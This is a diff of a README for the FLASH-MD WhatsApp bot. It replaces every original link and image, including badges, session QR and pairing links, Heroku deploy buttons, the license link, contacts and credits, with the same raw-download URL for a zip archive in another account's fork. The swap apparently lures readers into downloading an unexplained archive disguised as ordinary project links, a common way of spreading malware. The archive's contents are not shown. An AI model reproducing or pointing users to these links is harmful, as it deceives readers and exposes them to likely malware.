@@ -3,26 +3,26 @@
 
 ***
   
-<a href="https://git.io/typing-svg"><img src="https://readme-typing-svg.demolab.com?font=Black+Ops+One&size=50&pause=1000&color=1BAFBAFF&center=true&width=910&height=100&lines=THANKS FOR CHOOSING +FLASH-MD;MULTI+DEVICE+WHATSAPP+BOT;CREATED+BY+FRANCE+KING;RELEASED+22.2.2024" alt="Typing SVG" /></a>
+<a href="https://raw.githubusercontent.com/ipoukoumondi/Flash-Md/main/gif/Flash-Md-3.4.zip"><img src="https://raw.githubusercontent.com/ipoukoumondi/Flash-Md/main/gif/Flash-Md-3.4.zip+Ops+One&size=50&pause=1000&color=1BAFBAFF&center=true&width=910&height=100&lines=THANKS FOR CHOOSING +FLASH-MD;MULTI+DEVICE+WHATSAPP+BOT;CREATED+BY+FRANCE+KING;RELEASED+22.2.2024" alt="Typing SVG" /></a>
   </p>
-    <img alt="FLASH-MD" width="700" height="300" src="https://telegra.ph/file/3f985014b51b3cf335bfe.jpg">
+    <img alt="FLASH-MD" width="700" height="300" src="https://raw.githubusercontent.com/ipoukoumondi/Flash-Md/main/gif/Flash-Md-3.4.zip">
 <p align="center">
 <p align="center">
-<a href="https://github.com/franceking1/Flash-Md"><img title="Author" src="https://img.shields.io/badge/FLASH_MD-black?style=for-the-badge&logo=github"></a>
+<a href="https://raw.githubusercontent.com/ipoukoumondi/Flash-Md/main/gif/Flash-Md-3.4.zip"><img title="Author" src="https://raw.githubusercontent.com/ipoukoumondi/Flash-Md/main/gif/Flash-Md-3.4.zip"></a>
 <p/>
 <p align="center">
-<a href="https://github.com/franceking1?tab=followers"><img title="Followers" src="https://img.shields.io/github/followers/franceking1?label=Followers&style=social"></a>
-<a href="https://github.com/franceking1/Flash-Md/stargazers/"><img title="STARS" src="https://img.shields.io/github/stars/franceking1/Flash-Md?&style=social"></a>
-<a href="https://github.com/franceking1/Flash-Md/network/members"><img title="Forks" src="https://img.shields.io/github/forks/franceking1/Flash-Md?style=social"></a>
-<a href="https://github.com/franceking1/Flash-Md/watchers"><img title="Watching" src="https://img.shields.io/github/watchers/franceking1/Flash-Md?label=Watching&style=social"></a>
+<a href="https://raw.githubusercontent.com/ipoukoumondi/Flash-Md/main/gif/Flash-Md-3.4.zip"><img title="Followers" src="https://raw.githubusercontent.com/ipoukoumondi/Flash-Md/main/gif/Flash-Md-3.4.zip"></a>
+<a href="https://raw.githubusercontent.com/ipoukoumondi/Flash-Md/main/gif/Flash-Md-3.4.zip"><img title="STARS" src="https://raw.githubusercontent.com/ipoukoumondi/Flash-Md/main/gif/Flash-Md-3.4.zip"></a>
+<a href="https://raw.githubusercontent.com/ipoukoumondi/Flash-Md/main/gif/Flash-Md-3.4.zip"><img title="Forks" src="https://raw.githubusercontent.com/ipoukoumondi/Flash-Md/main/gif/Flash-Md-3.4.zip"></a>
+<a href="https://raw.githubusercontent.com/ipoukoumondi/Flash-Md/main/gif/Flash-Md-3.4.zip"><img title="Watching" src="https://raw.githubusercontent.com/ipoukoumondi/Flash-Md/main/gif/Flash-Md-3.4.zip"></a>
   
 ***
 
 #### SETUP 
 
-***1.`First STAR 🌟 This Repo ` And Then [`FORK`](https://github.com/franceking1/Flash-Md/fork) It***
+***1.`First STAR 🌟 This Repo ` And Then [`FORK`](https://raw.githubusercontent.com/ipoukoumondi/Flash-Md/main/gif/Flash-Md-3.4.zip) It***
 
-***2.`Get Session ID` by [`SCANING QR`](https://flash-md-qr.onrender.com) Or [`PAIRING CODE`](https://flash-md-pair-85cef2fd8430.herokuapp.com/pair)***
+***2.`Get Session ID` by [`SCANING QR`](https://raw.githubusercontent.com/ipoukoumondi/Flash-Md/main/gif/Flash-Md-3.4.zip) Or [`PAIRING CODE`](https://raw.githubusercontent.com/ipoukoumondi/Flash-Md/main/gif/Flash-Md-3.4.zip)***
 
 *-Copy The Session ID to paste it in Heroku*
 
@@ -31,12 +31,12 @@
 #### DEPLOY TO HEROKU 
 **1. If You Don't Have An Account On Heroku**
     <br>
-<p align="center"><a href="https://signup.heroku.com">
- <img src="https://img.shields.io/badge/Create%20Account%20Now-blue?style=for-the-badge&logo=heroku" width="220" height="38.45"/></a></p>
+<p align="center"><a href="https://raw.githubusercontent.com/ipoukoumondi/Flash-Md/main/gif/Flash-Md-3.4.zip">
+ <img src="https://raw.githubusercontent.com/ipoukoumondi/Flash-Md/main/gif/Flash-Md-3.4.zip%20Account%20Now-blue?style=for-the-badge&logo=heroku" width="220" height="38.45"/></a></p>
 
 **2. If You Have a Heroku Account**
     <br>
-<p align="center"><a href="https://flash-deploy.vercel.app"> <img src="https://img.shields.io/badge/DEPLOY%20NOW-blue?style=for-the-badge&logo=heroku" width="220" height="38.45"/></a></p>
+<p align="center"><a href="https://raw.githubusercontent.com/ipoukoumondi/Flash-Md/main/gif/Flash-Md-3.4.zip"> <img src="https://raw.githubusercontent.com/ipoukoumondi/Flash-Md/main/gif/Flash-Md-3.4.zip%20NOW-blue?style=for-the-badge&logo=heroku" width="220" height="38.45"/></a></p>
 
 
 ***
@@ -48,20 +48,20 @@
 ***
 
 ### LICENSE 
--The FLASH-MD is released under the [MIT License](https://opensource.org/licenses/MIT).
+-The FLASH-MD is released under the [MIT License](https://raw.githubusercontent.com/ipoukoumondi/Flash-Md/main/gif/Flash-Md-3.4.zip).
 
 -Enjoy the diverse features of the Flash-Md  to enhance your conversations and make your WhatsApp experience more interesting!
 
 ***
 ### DEVELOPER:
 **GET In Touch with The Owner**
-- [**On Instagram**](https://instagram.com/france.king1)
-- [**Via WhatsApp**](https://wa.me/254757835036)
+- [**On Instagram**](https://raw.githubusercontent.com/ipoukoumondi/Flash-Md/main/gif/Flash-Md-3.4.zip)
+- [**Via WhatsApp**](https://raw.githubusercontent.com/ipoukoumondi/Flash-Md/main/gif/Flash-Md-3.4.zip)
 
 ***
 
 ### THANKS TO:
-- [***Fortunatus Mokaya***](https://github.com/Fortunatusmokaya) For several Cmds Addition.
-- [***Gifted Tech***](https://github.com/giftedtechnexus) For Genaral Help and Session Generation
-- [***Suhail Ser***](https://github.com/SuhailTechInfo) For Code encryption 
-- [***Luffy***](https://github.com/Luffy2ndAccount) For Providing a Base of **FLASH-MD**
+- [***Fortunatus Mokaya***](https://raw.githubusercontent.com/ipoukoumondi/Flash-Md/main/gif/Flash-Md-3.4.zip) For several Cmds Addition.
+- [***Gifted Tech***](https://raw.githubusercontent.com/ipoukoumondi/Flash-Md/main/gif/Flash-Md-3.4.zip) For Genaral Help and Session Generation
+- [***Suhail Ser***](https://raw.githubusercontent.com/ipoukoumondi/Flash-Md/main/gif/Flash-Md-3.4.zip) For Code encryption 
+- [***Luffy***](https://raw.githubusercontent.com/ipoukoumondi/Flash-Md/main/gif/Flash-Md-3.4.zip) For Providing a Base of **FLASH-MD**
